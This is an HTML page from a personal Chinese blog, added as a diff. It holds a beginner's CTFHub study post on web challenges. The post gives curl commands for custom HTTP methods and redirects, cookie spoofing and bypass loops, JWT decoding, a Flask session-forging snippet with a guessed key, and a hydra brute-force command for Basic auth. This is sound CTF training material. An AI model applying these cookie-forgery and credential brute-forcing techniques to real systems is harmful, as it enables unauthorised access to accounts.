@@ -1,0 +1,903 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="linqt">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="学习资源 - CTF WikiCTFHub 基础知识 一般情况下flag拥有固定格式为flag&#123;xxxxx&#125;，有些比赛会把flag关键词替换，例如我们CTFHub平台的flag为ctfhub&#123;xxxxx&#125;，利用固定格式来反推flag也是一种常见的解题思路  竞赛模式：竞赛模式 | CTFHub Jeopardy-解题题目类型主要包含 Web 网络攻防 、 R">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF_learning">
+<meta property="og:url" content="https://pqcu77.github.io/2025/07/11/CTF-learning/index.html">
+<meta property="og:site_name" content="linqt&#39;s blog">
+<meta property="og:description" content="学习资源 - CTF WikiCTFHub 基础知识 一般情况下flag拥有固定格式为flag&#123;xxxxx&#125;，有些比赛会把flag关键词替换，例如我们CTFHub平台的flag为ctfhub&#123;xxxxx&#125;，利用固定格式来反推flag也是一种常见的解题思路  竞赛模式：竞赛模式 | CTFHub Jeopardy-解题题目类型主要包含 Web 网络攻防 、 R">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pqcu77.github.io/img/file-20250711210848823.png">
+<meta property="og:image" content="https://pqcu77.github.io/img/file-20250711211831850.png">
+<meta property="og:image" content="https://pqcu77.github.io/img/file-20250711212530125.png">
+<meta property="og:image" content="https://pqcu77.github.io/img/file-20250711212557235.png">
+<meta property="og:image" content="https://pqcu77.github.io/img/image-20250711215126386.png">
+<meta property="og:image" content="https://pqcu77.github.io/img/file-20250712153206167.png">
+<meta property="article:published_time" content="2025-07-11T08:17:47.000Z">
+<meta property="article:modified_time" content="2025-07-12T07:32:34.282Z">
+<meta property="article:author" content="linqt">
+<meta property="article:tag" content="Plans">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://pqcu77.github.io/img/file-20250711210848823.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>CTF_learning - linqt&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/custom/custom.css">
+<link rel="stylesheet" href="/custom/welcome.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"pqcu77.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>PQCU&#39; blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="CTF_learning"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-07-11 16:17" pubdate>
+          2025年7月11日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          1.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          11 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span>次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">CTF_learning</h1>
+            
+              <p id="updated-time" class="note note-info" style="display: none">
+                
+                  
+                    本文最后更新于 2025-07-12T15:32:34+08:00
+                  
+                  
+
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/introduction/resources/">学习资源 - CTF Wiki</a><br><a target="_blank" rel="noopener" href="https://www.ctfhub.com/#/skilltree">CTFHub</a></p>
+<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><ul>
+<li>一般情况下flag拥有固定格式为<code>flag&#123;xxxxx&#125;</code>，有些比赛会把flag关键词替换，例如我们CTFHub平台的flag为<code>ctfhub&#123;xxxxx&#125;</code>，利用固定格式来反推flag也是一种常见的解题思路</li>
+</ul>
+<h2 id="竞赛模式："><a href="#竞赛模式：" class="headerlink" title="竞赛模式："></a>竞赛模式：</h2><p><a target="_blank" rel="noopener" href="https://writeup.ctfhub.com/Skill/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/mmJYyc569kAXHvfam4qont.html">竞赛模式 | CTFHub</a></p>
+<h3 id="Jeopardy-解题"><a href="#Jeopardy-解题" class="headerlink" title="Jeopardy-解题"></a>Jeopardy-解题</h3><p>题目类型主要包含 Web 网络攻防 、 RE 逆向工程 、 Pwn 二进制漏洞利用 、 Crypto 密码攻击以及 Misc 安全杂项 这五个类别，个别比赛会根据题目类型进行扩展。</p>
+<h1 id="Have-a-try"><a href="#Have-a-try" class="headerlink" title="Have a try"></a>Have a try</h1><p>CTFHub|HTTP协议<br><img src="/img/file-20250711210848823.png" srcset="/img/loading.gif" lazyload><br><strong>HTTP 请求方法是什么？</strong><br>HTTP 协议中定义了常见的请求方法，比如：</p>
+<ul>
+<li><p><code>GET</code>（获取数据）</p>
+</li>
+<li><p><code>POST</code>（提交数据） </p>
+</li>
+<li><p><code>PUT</code>（上传文件）    </p>
+</li>
+<li><p><code>DELETE</code>（删除资源）   </p>
+</li>
+<li><p>等等（如题目中提到的 <code>OPTIONS</code>、<code>HEAD</code>、<code>TRACE</code>、<code>CONNECT</code>）。<br>但题目要求你用的方法<strong>不在这些标准方法里</strong>，比如可能是 <code>CTFHUB</code>、<code>FLAG</code> 这种自定义方法。</p>
+</li>
+<li><p>方法1：用curl工具（命令行工具）</p>
+</li>
+</ul>
+<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs objectivec">curl -X <span class="hljs-built_in">CTFHUB</span> http:<span class="hljs-comment">//题目网址/</span><br></code></pre></td></tr></table></figure>
+<p><code>-X</code> 参数可以指定任意 HTTP 方法（如 <code>CTFHUB</code>）。<br>其中，<code>-v</code>参数用于输出通信的整个过程，包括端口连接和 HTTP request 头信息，让我们可以清晰地看到请求的详细情况。-X参数用于指定 HTTP 请求的方法。在本题中，我们需要将请求方法指定为 “CTFHUB”。</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">curl -v -<span class="hljs-keyword">X</span> CTFHUB http://challenge-<span class="hljs-number">4</span>c532e941e569c86.<span class="hljs-keyword">sandbox</span>.ctfhub.<span class="hljs-keyword">com</span>:<span class="hljs-number">10800</span>/<span class="hljs-built_in">index</span>.php<br></code></pre></td></tr></table></figure>
+<ul>
+<li>方法2：burp抓包</li>
+</ul>
+<h2 id="HTTP临时重定向"><a href="#HTTP临时重定向" class="headerlink" title="HTTP临时重定向"></a>HTTP临时重定向</h2><p>HTTP 临时重定向（状态码 302 Found）是HTTP协议中一种常见的重定向方式，它告诉客户端请求的资源暂时<strong>位于另一个URI下</strong>，客户端应当<strong>使用GET方法向这个新URI发起请求</strong>。</p>
+<p>工作原理</p>
+<ol>
+<li>客户端向服务器发送请求</li>
+<li>服务器返回302状态码和Location头部</li>
+<li>客户端自动向Location指定的新地址发起GET请求</li>
+</ol>
+<p>解题步骤：</p>
+<ol>
+<li>识别重定向<ul>
+<li>使用浏览器开发者工具查看网络请求</li>
+<li>使用curl -v URL 查看详细请求&#x2F;相应</li>
+<li>注意响应中的302 Found状态码和Location头部</li>
+</ul>
+</li>
+<li>绕过重定向限制</li>
+</ol>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">curl -L <span class="hljs-built_in">URL</span>  <span class="hljs-comment"># 自动跟随重定向</span><br>curl -i <span class="hljs-built_in">URL</span>  <span class="hljs-comment"># 显示原始响应(不跟随重定向)</span><br></code></pre></td></tr></table></figure>
+<ol start="3">
+<li>分析重定向逻辑：<ul>
+<li>检查重定向是否有规律</li>
+<li>查看是否有重定向循环</li>
+<li>检查cookie或session对重定向的影响</li>
+</ul>
+</li>
+</ol>
+<p><img src="/img/file-20250711211831850.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">curl -v http://challenge-bc8c3e1ba08f24e1.<span class="hljs-keyword">sandbox</span>.ctfhub.<span class="hljs-keyword">com</span>:<span class="hljs-number">10800</span>/<span class="hljs-built_in">index</span>.php<br></code></pre></td></tr></table></figure>
+
+<h2 id="Cookie欺骗、认证、伪造"><a href="#Cookie欺骗、认证、伪造" class="headerlink" title="Cookie欺骗、认证、伪造"></a>Cookie欺骗、认证、伪造</h2><ol>
+<li>Cookie基础分析<br>先试用curl或浏览器查看cookie设置</li>
+</ol>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">curl <span class="hljs-punctuation">-</span>v http<span class="hljs-punctuation">:</span><span class="hljs-comment">//target.com/login</span><br></code></pre></td></tr></table></figure>
+<p>常见Cookie安全属性：</p>
+<ul>
+<li><code>HttpOnly</code> - 阻止JavaScript访问</li>
+<li><code>Secure</code> - 仅HTTPS传输</li>
+<li><code>SameSite</code> - 限制跨站请求</li>
+<li><code>Expires/Max-Age</code> - 控制有效期</li>
+</ul>
+<ol start="2">
+<li>Cookie欺骗攻击<br>方法1：直接修改Cookie值</li>
+</ol>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">curl</span> -<span class="hljs-keyword">b</span> <span class="hljs-string">&quot;user=admin&quot;</span> http:<span class="hljs-comment">//target.com/dashboard</span><br></code></pre></td></tr></table></figure>
+
+<p>方法2：布尔型cookie欺骗</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-comment"># 尝试各种布尔值变体</span><br><span class="hljs-symbol">curl</span> -<span class="hljs-keyword">b</span> <span class="hljs-string">&quot;admin=true&quot;</span> http:<span class="hljs-comment">//target.com/admin</span><br><span class="hljs-symbol">curl</span> -<span class="hljs-keyword">b</span> <span class="hljs-string">&quot;admin=1&quot;</span> http:<span class="hljs-comment">//target.com/admin</span><br><span class="hljs-symbol">curl</span> -<span class="hljs-keyword">b</span> <span class="hljs-string">&quot;admin=on&quot;</span> http:<span class="hljs-comment">//target.com/admin</span><br></code></pre></td></tr></table></figure>
+
+<p>方法3：数字型Cookie递增</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;0..9&#125;; <span class="hljs-keyword">do</span><br>  curl -b <span class="hljs-string">&quot;role=<span class="hljs-variable">$i</span>&quot;</span> http://target.com/admin | grep flag<br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>cookie认证绕过<br>方法1：删除Cookie测试</li>
+</ol>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">curl</span> -v http://target.com/admin<br><span class="hljs-comment"># 不发送任何Cookie看响应</span><br></code></pre></td></tr></table></figure>
+
+<p>方法2：空值Cookie测试</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">curl</span> -<span class="hljs-keyword">b</span> <span class="hljs-string">&quot;session=&quot;</span> http:<span class="hljs-comment">//target.com/admin</span><br></code></pre></td></tr></table></figure>
+
+<p>方法3：常见Cookie名称爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> cookie <span class="hljs-keyword">in</span> session token auth userid; <span class="hljs-keyword">do</span><br>  curl -b <span class="hljs-string">&quot;<span class="hljs-variable">$cookie</span>=admin&quot;</span> http://target.com/admin<br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>Cookie 伪造攻击<br>方法1：JWT令牌攻击</li>
+</ol>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs coq">#解码JWT<br>echo <span class="hljs-string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.xxxx&quot;</span> | <span class="hljs-type">jq</span> -R &#x27;<span class="hljs-built_in">split</span>(<span class="hljs-string">&quot;.&quot;</span>) | <span class="hljs-type">.[0</span>],.[<span class="hljs-number">1</span>] | <span class="hljs-type">@base64d</span>&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>方法2：Flask session伪造</p>
+<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> URLSafeTimedSerializer<br>secret_key = <span class="hljs-string">&#x27;guessme&#x27;</span>  <span class="hljs-comment"># 尝试常见密钥</span><br>serializer = URLSafeTimedSerializer(secret_key)<br><span class="hljs-built_in">print</span>(serializer.dumps(&#123;<span class="hljs-string">&#x27;user&#x27;</span>:<span class="hljs-string">&#x27;admin&#x27;</span>&#125;))<br></code></pre></td></tr></table></figure>
+
+<p>方法3：查看cookie编码方式</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># Base64解码示例</span><br>echo <span class="hljs-string">&quot;dXNlcj1ndWVzdA==&quot;</span> | base64 -d<br><span class="hljs-comment"># URL解码示例</span><br>echo <span class="hljs-string">&quot;%7B<span class="hljs-variable">%2</span>2user<span class="hljs-variable">%2</span>2%3A<span class="hljs-variable">%2</span>2test<span class="hljs-variable">%2</span>2<span class="hljs-variable">%7D</span>&quot;</span> | python -c <span class="hljs-string">&quot;import sys, urllib.parse; print(urllib.parse.unquote(sys.stdin.read()))&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/file-20250711212530125.png" srcset="/img/loading.gif" lazyload><br>先尝试了cookie欺骗：<br><img src="/img/file-20250711212557235.png" srcset="/img/loading.gif" lazyload><br>发现布尔型欺骗可以得到flag</p>
+<h2 id="基本认证"><a href="#基本认证" class="headerlink" title="基本认证"></a>基本认证</h2><p>在<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP" title="HTTP">HTTP</a>中，<strong>基本认证</strong>（英语：Basic access authentication）是允许<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%94%A8%E6%88%B7%E4%BB%A3%E7%90%86" title="用户代理">http用户代理</a>（如：<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%BD%91%E9%A1%B5%E6%B5%8F%E8%A7%88%E5%99%A8" title="网页浏览器">网页浏览器</a>）在请求时，提供 <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%94%A8%E6%88%B7%E5%90%8D" title="用户名">用户名</a> 和 <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%8F%A3%E4%BB%A4" title="密码">密码</a> 的一种方式。</p>
+<h3 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h3><ol>
+<li>客户端访问受保护资源</li>
+<li>服务器返回401 Unauthorized，包含<code>WWW-Authenticate: Basic</code>头</li>
+<li>客户端弹出登录框，用户输入凭据</li>
+<li>浏览器将用户名密码用Base64编码后发送<code>Authorization: Basic &lt;credentials&gt;</code></li>
+<li>服务器验证通过后返回资源</li>
+</ol>
+<h3 id="识别基本认证"><a href="#识别基本认证" class="headerlink" title="识别基本认证"></a>识别基本认证</h3><p>使用curl检测</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">curl</span> -v http://target.com/protected<br><span class="hljs-comment"># 会返回401和WWW-Authenticate头</span><br></code></pre></td></tr></table></figure>
+
+<p>响应特征</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">401</span> Unauthorized<br><span class="hljs-attribute">WWW-Authenticate</span><span class="hljs-punctuation">: </span>Basic realm=&quot;Restricted Area&quot;<br></code></pre></td></tr></table></figure>
+
+<p>常见的攻击方法：</p>
+<p>方法1：暴力破解</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-meta"># 使用hydra暴力破解</span><br>hydra -L users.txt -P passwords.txt target.com http-<span class="hljs-keyword">get</span> /<span class="hljs-keyword">protected</span><br></code></pre></td></tr></table></figure>
+
+<p>方法2：Base64解码&#x2F;编码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 解码发现的凭证</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;dXNlcm5hbWU6cGFzc3dvcmQ=&quot;</span> | <span class="hljs-built_in">base64</span> -d<br><br><span class="hljs-comment"># 编码自定义凭证</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;admin:secret&quot;</span> | <span class="hljs-built_in">base64</span><br></code></pre></td></tr></table></figure>
+
+<p>方法3：直接发送认证头</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># 使用已知凭据</span><br>curl <span class="hljs-punctuation">-</span>H <span class="hljs-string">&quot;Authorization: Basic YWRtaW46c2VjcmV0&quot;</span> http<span class="hljs-punctuation">:</span><span class="hljs-comment">//target.com/protected</span><br><br><span class="hljs-meta"># 或使用curl的-u参数</span><br>curl <span class="hljs-punctuation">-</span>u admin<span class="hljs-punctuation">:</span>secret http<span class="hljs-punctuation">:</span><span class="hljs-comment">//target.com/protected</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>通过暴力破解后找到答案</p>
+<p><img src="/img/image-20250711215126386.png" srcset="/img/loading.gif" lazyload alt="image-20250711215126386"></p>
+<h2 id="查看phpinfo"><a href="#查看phpinfo" class="headerlink" title="查看phpinfo"></a>查看phpinfo</h2><p><img src="/img/file-20250712153206167.png" srcset="/img/loading.gif" lazyload><br>解题方法，点击查看之后搜索页面中的 <code>ctfhub&#123;</code> 即可找到。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Plans/" class="category-chain-item">Plans</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Plans/" class="print-no-link">#Plans</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>CTF_learning</div>
+      <div>https://pqcu77.github.io/2025/07/11/CTF-learning/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>linqt</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年7月11日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/07/12/kaiwu/" title="Kaiwu">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Kaiwu</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/06/18/OS-lab9-update/" title="OS-Lab9-Update">
+                        <span class="hidden-mobile">OS-Lab9-Update</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
